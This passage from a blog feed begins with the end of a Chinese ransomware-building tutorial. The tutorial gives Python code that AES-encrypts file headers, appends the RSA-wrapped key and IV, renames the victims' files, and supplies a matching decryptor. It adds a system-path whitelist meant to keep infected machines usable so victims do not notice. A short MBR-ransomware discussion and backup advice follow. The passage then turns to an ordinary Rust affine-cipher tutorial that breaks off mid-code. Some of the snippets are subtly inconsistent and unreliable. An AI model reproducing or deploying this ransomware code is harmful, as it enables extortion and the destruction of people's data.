class="hljs-number">0</span>)<br>input_file.write(ciphered_bytes)<br></code></pre></td></tr></table></figure></p></li><li><p>将加密用的随机密钥添加到文件末尾</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">input_file.seek(<span class="hljs-number">0</span>, os.SEEK_END)<br>input_file.write(encriptedKey.encode())<br></code></pre></td></tr></table></figure></p></li><li><p>在文件末尾附加<ahref="https://en.wikipedia.org/wiki/Initialization_vector">AESIV（初始化向量）</a></p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">input_file.seek(<span class="hljs-number">0</span>, os.SEEK_END)<br>input_file.write(cipher_encrypt.iv)<br></code></pre></td></tr></table></figure></p></li><li><p>重命名文件</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">input_file.close()<br>os.rename(file, file + <span class="hljs-string">&quot;.&quot;</span> + cryptoName)<br></code></pre></td></tr></table></figure></p></li></ol><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/勒索软件结构与加密模式研究/Encryption_process.png"alt="Rough mock up of the file structure" /><figcaption aria-hidden="true">Rough mock up of the filestructure</figcaption></figure><p>需要注意的是我们并不需要复制完整的文件，我们只是在文件上使用了<code>seek()</code>来定位字节并使过程尽可能快。这也将在解密功能中使用。</p><p>还要注意，由于我们在加密文件中同时写入了AESIV和加密密钥，因此我们不需要任何带有每个加密文件索引的txt文件。受害者可以向我们发送任何文件，只要我们拥有用于特定二进制文件的私钥，我们就可以对其解密。</p><h3 id="symdecryptfile">SymDecryptFile</h3><p>这是主要的解密函数。工作流程如下：</p><ol type="1"><li><p>使用privateKey和文件路径作为参数调用该函数</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">symDecryptFile</span>(<span class="hljs-params">privateKey, file</span>):<br></code></pre></td></tr></table></figure></p></li><li><p>定义文件的解密大小（n个字节）（等于加密中使用的大小）</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">buffer_size = <span class="hljs-number">1048576</span><br></code></pre></td></tr></table></figure></p></li><li><p>验证文件是否已加密（带有扩展名）</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> file.endswith(<span class="hljs-string">&quot;.&quot;</span> + cryptoName):<br>    out_filename = file[:-(<span class="hljs-built_in">len</span>(cryptoName) + <span class="hljs-number">1</span>)]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypting file: &quot;</span> + file)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;File is not encrypted&#x27;</span>)<br>    <span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure></p></li><li><p>打开文件并读取AES IV（最后16个字节）</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">input_file = <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&#x27;r+b&#x27;</span>)<br><span class="hljs-comment"># Read in the iv</span><br>input_file.seek(-<span class="hljs-number">16</span>, os.SEEK_END)<br>iv = input_file.read(<span class="hljs-number">16</span>)<br></code></pre></td></tr></table></figure></p></li><li><p>读取加密的解密密钥</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># we move the pointer to 274 bytes before the end of file</span><br><span class="hljs-comment"># (258 bytes of the encryption key + 16 of the AES IV)</span><br>input_file.seek(-<span class="hljs-number">274</span>, os.SEEK_END)<br><span class="hljs-comment"># And we read the 258 bytes of the key</span><br>secret = input_file.read(<span class="hljs-number">258</span>)<br></code></pre></td></tr></table></figure></p></li><li><p>使用提供的私钥解密加密的密钥</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">key = rsaDecryptSecret(cert, secret)<br></code></pre></td></tr></table></figure></p></li><li><p>解密我们之前定义的aes加密的缓冲区大小，并将其写入文件的开头</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Create the cipher object</span><br>cipher_encrypt = AES.new(privateKey, AES.MODE_CFB, iv=iv) <br><span class="hljs-comment"># Read the encrypted header     </span><br>input_file.seek(<span class="hljs-number">0</span>) <br>buffer = input_file.read(buffer_size)<br><span class="hljs-comment"># Decrypt the header with the key</span><br>decrypted_bytes = cipher_encrypt.decrypt(buffer) <br><span class="hljs-comment"># Write the decrypted text on the same file</span><br>input_file.seek(<span class="hljs-number">0</span>)<br>input_file.write(decrypted_bytes)<br></code></pre></td></tr></table></figure></p></li><li><p>从文件末尾删除iv和加密密钥并重命名</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Delete the last 274 bytes from the IV + key. </span><br>input_file.seek(-<span class="hljs-number">274</span>, os.SEEK_END)  <br>input_file.truncate()  <br>input_file.close() <br><span class="hljs-comment"># Rename the file to delete the encrypted extension  </span><br>os.rename(file, out_filename)<br></code></pre></td></tr></table></figure></p></li></ol><h1 id="总结">总结</h1><p>使用上述函数，我们就可以获得想要的最终二进制文件了。如果正确编译了<code>symEncryptDirectory / symDecryptDirectory</code>，则可以选择对参数中的文件夹/文件进行加密或解密，然后仅传递.pem文件。程序的参数选择大致如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">parser = argparse.ArgumentParser()<br><br>parser.add_argument(<span class="hljs-string">&quot;--dest&quot;</span>, <span class="hljs-string">&quot;-d&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;File or directory to encrypt/decrypt&quot;</span>, dest=<span class="hljs-string">&quot;destination&quot;</span>, default=<span class="hljs-string">&quot;none&quot;</span>, required=<span class="hljs-literal">True</span>)<br><br>parser.add_argument(<span class="hljs-string">&quot;--action&quot;</span>, <span class="hljs-string">&quot;-a&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Action (encrypt/decrypt)&quot;</span>, dest=<span class="hljs-string">&quot;action&quot;</span>, required=<span class="hljs-literal">True</span>)<br> <br>parser.add_argument(<span class="hljs-string">&quot;--pem&quot;</span>,<span class="hljs-string">&quot;-p&quot;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;Public/Private key&quot;</span>, dest=<span class="hljs-string">&quot;key&quot;</span>, required=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>除了缺少错误处理模块（检查encrypt操作是否具有作为参数传递的公钥，decrypt是否具有私钥等）之外，我们还必须定义各类操作系统的白名单。这步操作是为了使计算机“可用”但仍处于加密状态。如果您只是加密所有可见文件，则可能会：</p><ol type="1"><li>使计算机无法使用，这将使受害者发现问题。</li><li>对所有内容进行加密后，系统将无法启动，并且用户将不知道自己遭到了勒索软件的攻击。</li></ol><p>在Linux下，白名单类似于：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">whitelist = [<span class="hljs-string">&quot;/etc/ssh&quot;</span>, <span class="hljs-string">&quot;/etc/pam.d&quot;</span>, <span class="hljs-string">&quot;/etc/security/&quot;</span>, <span class="hljs-string">&quot;/boot&quot;</span>, <span class="hljs-string">&quot;/run&quot;</span>, <span class="hljs-string">&quot;/usr&quot;</span>, <span class="hljs-string">&quot;/snap&quot;</span>, <span class="hljs-string">&quot;/var&quot;</span>, <span class="hljs-string">&quot;/sys&quot;</span>, <span class="hljs-string">&quot;/proc&quot;</span>, <span class="hljs-string">&quot;/dev&quot;</span>, <span class="hljs-string">&quot;/bin&quot;</span>, <span class="hljs-string">&quot;/sbin&quot;</span>, <span class="hljs-string">&quot;/lib&quot;</span>, <span class="hljs-string">&quot;passwd&quot;</span>, <span class="hljs-string">&quot;shadow&quot;</span>, <span class="hljs-string">&quot;known_hosts&quot;</span>, <span class="hljs-string">&quot;sshd_config&quot;</span>, <span class="hljs-string">&quot;/home/sec/.viminfo&quot;</span>, <span class="hljs-string">&#x27;/etc/crontab&#x27;</span>, <span class="hljs-string">&quot;/etc/default/locale&quot;</span>, <span class="hljs-string">&quot;/etc/environment&quot;</span>]<br></code></pre></td></tr></table></figure><h1 id="其他形式的勒索软件mbr加密">其他形式的勒索软件（MBR加密）</h1><p>目前还存在其他类型的勒索软件，例如某些勒索软件感染了驱动器的<ahref="https://en.wikipedia.org/wiki/Master_boot_record">主启动记录</a>，而payload将加密文件系统的NTFS文件表，从而使磁盘无法使用。由于这类勒索软件只需要加密一小部分数据，因此这种方法非常快<sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="">[5]</span></a></sup>。Petya勒索软件就是这种设计的一个很好的例子。但它有三个主要缺点：</p><ol type="1"><li>即使操作系统无法启动，我们仍然可以通过取证分析来恢复文件。它们并不会被删除，只是在文件表中被取消引用。即使恶意软件在重新启动计算机后启动了原始数据的加密例程，只要受害者立即关闭计算机并取出磁盘，文件也有很大可能可以通过取证分析得到恢复。</li><li>大多数现代操作系统已迁移到GPT（GUID分区表），不再使用MBR<sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="">[6]</span></a></sup>。</li><li>它严重依赖于文件系统，并且需要对其进行修改以考虑其他区别于NTFS的文件系统类型（如EXT3/EXT4，ZFS等）。</li></ol><p>这种方法需要了解更多的底层技术知识，另外，这种方法也不是最常用的方法，本文的主要目的是更好地理解<strong>常见</strong>的勒索软件。</p><h1 id="建议">建议</h1><p>除了一些显而易见的建议（不要打开来自未知来源的文件，经常更新软件和系统，使用杀毒软件等）之外，最主要的预防技术就是备份，备份和备份。。。或许还有很多有关如何防止攻击的建议，但我认为最好的办法永远是拥有数据的脱机备份。</p><p><del>毕竟一个局域网内不是所有人都可以做到以上几点</del></p><p>Ps.如果您已被感染，并且不需要立即恢复加密文件（家庭照片，视频等），那么可以尝试保留加密文件的副本。有时，勒索软件的开发人员要么退休（<ahref="https://www.zdnet.com/article/shade-troldesh-ransomware-shuts-down-and-releases-all-decryption-keys/">Shade</a>，<ahref="https://www.jdsupra.com/legalnews/teslacrypt-ransomware-developers-retire-60100/">TeslaCrypt</a>，HildaCrypt），要么被捕（<ahref="https://www.kaspersky.com/blog/coinvault-in-court/23123/">CoinVault</a>），甚至有时候会公开竞争对手的密钥（<ahref="https://blog.malwarebytes.com/cybercrime/2016/07/keys-to-chimera-ransomware-leaked/">PetyavsChimera</a>），这些情况下解密的密钥都可能被公开，从而恢复文件。<del>等等党永不为奴</del></p><h1 id="参考">参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><ahref="https://www.computerworld.com/article/2489311/cryptodefense-ransomware-leaves-decryption-key-accessible.html"class="uri">https://www.computerworld.com/article/2489311/cryptodefense-ransomware-leaves-decryption-key-accessible.html</a><a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2"class="footnote-text"><span><a href="https://blog.checkpoint.com/2014/08/27/hacking-the-hacker/"class="uri">https://blog.checkpoint.com/2014/08/27/hacking-the-hacker/</a><a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><ahref="https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/"class="uri">https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/</a><a href="#fnref:3" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><ahref="https://stackoverflow.com/questions/13378815/base64-length-calculation"class="uri">https://stackoverflow.com/questions/13378815/base64-length-calculation</a><a href="#fnref:4" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:5"class="footnote-text"><span><a href="https://en.wikipedia.org/wiki/Petya_(malware)"class="uri">https://en.wikipedia.org/wiki/Petya_(malware)</a><a href="#fnref:5" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><ahref="https://www.howtogeek.com/193669/whats-the-difference-between-gpt-and-mbr-when-partitioning-a-drive/"class="uri">https://www.howtogeek.com/193669/whats-the-difference-between-gpt-and-mbr-when-partitioning-a-drive/</a><a href="#fnref:6" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:7" class="footnote-text"><span><ahref="https://github.com/tarcisio-marinho/GonnaCry">GonnaCry勒索软件</a><a href="#fnref:7" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:8" class="footnote-text"><span><ahref="https://medium.com/bugbountywriteup/architecture-of-a-ransomware-1-2-1b9fee757fcb">Architectureof a ransomware</a><a href="#fnref:8" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Security Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ransomware</tag>
      
      <tag>Malware</tag>
      
      <tag>Hybrid Cryptosystem</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>密码学初探-基于RUST的密码系统与算法简析</title>
    <link href="/2020/12/27/A-Brief-Analysis-of-Cryptographic-Algorithm-RUST/"/>
    <url>/2020/12/27/A-Brief-Analysis-of-Cryptographic-Algorithm-RUST/</url>
    
    <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1><p>密码学（Cryptography）一般可分为古典密码学和现代密码学。</p><p>其中，古典密码学，作为一种实用性艺术存在，其编码和破译通常依赖于设计者和敌手的创造力与技巧，并没有对密码学原件进行清晰的定义。古典密码学主要包含以下几个方面：</p><ul><li>单表替换加密（Monoalphabetic Cipher）</li><li>多表替换加密（Polyalphabetic Cipher）</li><li>奇奇怪怪的加密方式</li></ul><p>而现代密码学则起源于 20 世纪中后期出现的大量相关理论，1949 年香农（C.E.Shannon）发表了题为《保密系统的通信理论》的经典论文标志着现代密码学的开始。现代密码学主要包含以下几个方面：</p><ul><li>对称加密（Symmetric Cryptography），以 DES，AES，RC4 为代表。</li><li>非对称加密（Asymmetric Cryptography），以RSA，ElGamal，椭圆曲线加密为代表。</li><li>哈希函数（Hash Function），以 MD5，SHA-1，SHA-512 等为代表。</li><li>数字签名（Digital Signature），以 RSA 签名，ElGamal 签名，DSA签名为代表。</li></ul><p>其中，对称加密体制主要分为两种方式：</p><ul><li>分组密码（Block Cipher），又称为块密码。</li><li>序列密码（Stream Cipher），又称为流密码。</li></ul><p>一般来说，密码设计者的根本目标是保障信息及信息系统的</p><ul><li>机密性（Confidentiality）</li><li>完整性（Integrity）</li><li>可用性（Availability）</li><li>认证性（Authentication）</li><li>不可否认性（Non-repudiation）</li></ul><p>其中，前三者被称为信息安全的 CIA 三要素 。</p><p>本文主要介绍了仿射密码，流密码（RC4,LFSR+JK)，分组密码（DES,AES），非对称加密（rsa）和密码协议（Diffie_Hellman）。项目详细代码已于Github开源<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded" aria-label="">[1]</span></a></sup>。</p><h1 id="仿射密码">仿射密码</h1><h2 id="原理">原理</h2><p>仿射密码的加密函数是 <spanclass="math inline"><em>E</em>(<em>x</em>) = (<em>a</em><em>x</em> + <em>b</em>) (mod  <em>m</em>)</span>，其中</p><ul><li><span class="math inline"><em>x</em></span>表示明文按照某种编码得到的数字</li><li><span class="math inline"><em>a</em></span> 和 <spanclass="math inline"><em>m</em></span> 互质</li><li><span class="math inline"><em>m</em></span>是编码系统中字母的数目。</li></ul><p>解密函数是 <spanclass="math inline"><em>D</em>(<em>x</em>) = <em>a</em><sup>−1</sup>(<em>x</em> − <em>b</em>) (mod  <em>m</em>)</span>，其中<span class="math inline"><em>a</em><sup>−1</sup></span> 是 <spanclass="math inline"><em>a</em></span> 在 <spanclass="math inline">ℤ<sub><em>m</em></sub></span> 群的乘法逆元。</p><p>下面我们以 <spanclass="math inline"><em>E</em>(<em>x</em>) = (5<em>x</em> + 8) mod  26</span>函数为例子进行介绍，加密字符串为<code>AFFINE CIPHER</code>，这里我们直接采用字母表26个字母作为编码系统</p><table style="width:100%;"><thead><tr><th>明文</th><th>A</th><th>F</th><th>F</th><th>I</th><th>N</th><th>E</th><th>C</th><th>I</th><th>P</th><th>H</th><th>E</th><th>R</th></tr></thead><tbody><tr><td>x</td><td>0</td><td>5</td><td>5</td><td>8</td><td>13</td><td>4</td><td>2</td><td>8</td><td>15</td><td>7</td><td>4</td><td>17</td></tr><tr><td><span class="math inline"><em>y</em> = 5<em>x</em> + 8</span></td><td>8</td><td>33</td><td>33</td><td>48</td><td>73</td><td>28</td><td>18</td><td>48</td><td>83</td><td>43</td><td>28</td><td>93</td></tr><tr><td><span class="math inline"><em>y</em> mod  26</span></td><td>8</td><td>7</td><td>7</td><td>22</td><td>21</td><td>2</td><td>18</td><td>22</td><td>5</td><td>17</td><td>2</td><td>15</td></tr><tr><td>密文</td><td>I</td><td>H</td><td>H</td><td>W</td><td>V</td><td>C</td><td>S</td><td>W</td><td>F</td><td>R</td><td>C</td><td>P</td></tr></tbody></table><p>其对应的加密结果是 <code>IHHWVCSWFRCP</code>。</p><p>对于解密过程，正常解密者具有a与b，可以计算得到 <spanclass="math inline"><em>a</em><sup>−1</sup></span> 为21，所以其解密函数是<spanclass="math inline"><em>D</em>(<em>x</em>) = 21(<em>x</em> − 8) (mod  26)</span>，解密如下</p><table><thead><tr><th>密文</th><th style="text-align: left;">I</th><th style="text-align: left;">H</th><th>H</th><th>W</th><th>V</th><th>C</th><th>S</th><th>W</th><th>F</th><th>R</th><th>C</th><th>P</th></tr></thead><tbody><tr><td><span class="math inline"><em>y</em></span></td><td style="text-align: left;">8</td><td style="text-align: left;">7</td><td>7</td><td>22</td><td>21</td><td>2</td><td>18</td><td>22</td><td>5</td><td>17</td><td>2</td><td>15</td></tr><tr><td><spanclass="math inline"><em>x</em> = 21(<em>y</em> − 8)</span></td><td style="text-align: left;">0</td><td style="text-align: left;">-21</td><td>-21</td><td>294</td><td>273</td><td>-126</td><td>210</td><td>294</td><td>-63</td><td>189</td><td>-126</td><td>147</td></tr><tr><td><span class="math inline"><em>x</em> mod  26</span></td><td style="text-align: left;">0</td><td style="text-align: left;">5</td><td>5</td><td>8</td><td>13</td><td>4</td><td>2</td><td>8</td><td>15</td><td>7</td><td>4</td><td>17</td></tr><tr><td>明文</td><td style="text-align: left;">A</td><td style="text-align: left;">F</td><td>F</td><td>I</td><td>N</td><td>E</td><td>C</td><td>I</td><td>P</td><td>H</td><td>E</td><td>R</td></tr></tbody></table><p>可以看出其特点在于只有 26 个英文字母。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/基于RUST的密码学系统/仿射密码.png"alt="仿射密码" /><figcaption aria-hidden="true">仿射密码</figcaption></figure><h2 id="rust实现">Rust实现</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-comment">// Encrypt</span><br><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">ans</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">new</span>();<br><span class="hljs-keyword">for</span> <span class="hljs-variable">ch</span> <span class="hljs-keyword">in</span> msg.<span class="hljs-title function_ invoke__">chars</span>() &#123;<br>    <span class="hljs-keyword">if</span> ch.<span class="hljs-title function_ invoke__">is_ascii_alphabetic</span>() &#123;<br>        <span class="hljs-keyword">if</span> ch.<span class="hljs-title function_ invoke__">is_uppercase</span>() &#123;<br>            <span class="hljs-comment">// 大写字母</span><br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = ch <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span> - <span class="hljs-string">&#x27;A&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">y</span> = (upper_a * x + upper_b) % <span class="hljs-number">26</span>;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">target</span> = <span class="hljs-string">&#x27;A&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span> + y;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">new_ch</span> = <span class="hljs-type">char</span>::<span class="hljs-title function_ invoke__">try_from</span>(target).<span class="hljs-title function_ invoke__">unwrap</span>();<br>            ans.<span class="hljs-title function_ invoke__">push</span>(new_ch);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 小写字母</span><br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = ch <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span> - <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">y</span> = (lower_a * x + lower_b) % <span class="hljs-number">26</span>;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">target</span> = <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span> + y;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">new_ch</span> = <span class="hljs-type">char</span>::<span class="hljs-title function_ invoke__">try_from</span>(target).<span class="hljs-title function_ invoke__">unwrap</span>();<br>            ans.<span class="hljs-title function_ invoke__">push</span>(new_ch);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ch.<span class="hljs-title function_ invoke__">is_ascii_digit</span>() &#123;<br>        <span class="hljs-comment">// 数字</span><br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = ch <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span> - <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">y</span> = (number_a * x + number_b) % <span class="hljs-number">26</span>;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">target</span> = <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span> + y;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">new_ch</span> = <span class="hljs-type">char</span>::<span class="hljs-title function_ invoke__">try_from</span>(target).<span class="hljs-title function_ invoke__">unwrap</span>();<br>        ans.<span class="hljs-title function_ invoke__">push</span>(new_ch);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        ans.<span class="hljs-title function_ invoke__">push</span>(ch);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">Ok</span>(ans);<br><br><br><span class="hljs-comment">// Decrypt</span><br><span class="hljs-keyword">let</span> <span class="hljs-variable">lower_a_</span> = <span class="hljs-title function_ invoke__">exgcd</span>(lower_a <span class="hljs-keyword">as</span> <span class="hljs-type">i32</span>, <span class="hljs-number">26</span>) <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">upper_a_</span> = <span class="hljs-title function_ invoke__">exgcd</span>(upper_a <span class="hljs-keyword">as</span> <span class="hljs-type">i32</span>, <span class="hljs-number">26</span>) <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;<br><span class="hljs-keyword">let</span> <span class="hljs-variable">number_a_</span> = <span class="hljs-title function_ invoke__">exgcd</span>(number_a <span class="hljs-keyword">as</span> <span class="hljs-type">i32</span>, <span class="hljs-number">10</span>) <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;<br><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">ans</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">new</span>();<br><span class="hljs-keyword">for</span> <span class="hljs-variable">ch</span> <span class="hljs-keyword">in</span> msg.<span class="hljs-title function_ invoke__">chars</span>() &#123;<br>    <span class="hljs-keyword">if</span> ch.<span class="hljs-title function_ invoke__">is_ascii_alphabetic</span>() &#123;<br>        <span class="hljs-keyword">if</span> ch.<span class="hljs-title function_ invoke__">is_uppercase</span>() &#123;<br>            <span class="hljs-comment">// 大写字母</span><br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = ch <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span> - <span class="hljs-string">&#x27;A&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">y</span> = (upper_a_ * (x + <span class="hljs-number">26</span> - upper_b)) % <span class="hljs-number">26</span>;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">target</span> = <span class="hljs-string">&#x27;A&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span> + y;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">new_ch</span> = <span class="hljs-type">char</span>::<span class="hljs-title function_ invoke__">try_from</span>(target).<span class="hljs-title function_ invoke__">unwrap</span>();<br>            ans.<span class="hljs-title function_ invoke__">push</span>(new_ch);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 小写字母</span><br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = ch <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span> - <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">y</span> = (lower_a_ * (x + <span class="hljs-number">26</span> - lower_b)) % <span class="hljs-number">26</span>;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">target</span> = <span class="hljs-string">&#x27;a&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span> + y;<br>            <span class="hljs-keyword">let</span> <span class="hljs-variable">new_ch</span> = <span class="hljs-type">char</span>::<span class="hljs-title function_ invoke__">try_from</span>(target).<span class="hljs-title function_ invoke__">unwrap</span>();<br>            ans.<span class="hljs-title function_ invoke__">push</span>(new_ch);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ch.<span class="hljs-title function_ invoke__">is_ascii_digit</span>() &#123;<br>        <span class="hljs-comment">// 数字</span><br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">x</span> = ch <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span> - <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span>;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">y</span> = (number_a_ * (x + <span class="hljs-number">10</span> - number_b)) % <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">let</span> <span class="hljs-variable">target</span> = <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">as</span> <span class="hljs-type">u32</span> + y;<br>        <span 